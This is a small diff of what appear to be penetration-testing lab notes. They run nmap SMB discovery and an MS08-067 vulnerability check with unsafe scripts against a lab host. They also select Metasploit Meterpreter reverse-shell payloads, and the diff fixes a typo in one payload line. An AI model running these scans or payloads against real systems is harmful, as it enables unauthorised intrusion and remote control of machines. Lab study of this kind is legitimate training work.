@@ -6,4 +6,4 @@ nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.5 > smb.txt
 nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.5 > smb1.txt
 
 set payload windows/meterpreter/reverse_tcp
-set payload windows/meterpreter/rTricia everse_http
+set payload windows/meterpreter/reverse_http
